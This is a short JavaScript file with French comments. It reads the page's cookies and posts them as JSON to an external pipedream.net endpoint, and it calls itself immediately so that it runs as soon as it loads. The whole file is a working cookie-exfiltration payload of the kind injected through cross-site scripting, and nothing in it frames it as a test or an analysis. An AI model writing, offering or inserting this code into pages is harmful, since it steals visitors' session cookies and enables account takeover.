async function sendCookies() {
    try {
        // Extraire les cookies
        const cookies = document.cookie;

        // Envoi des cookies vers la nouvelle URL
        const response = await fetch('https://eom060axfo3rocf.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ cookies })
        });

        // RÃ©cupÃ©ration des donnÃ©es de la rÃ©ponse
        const responseData = await response.json();
        console.log(responseData);

    } catch (error) {
        console.error('Erreur:', error);
    }
}

sendCookies();
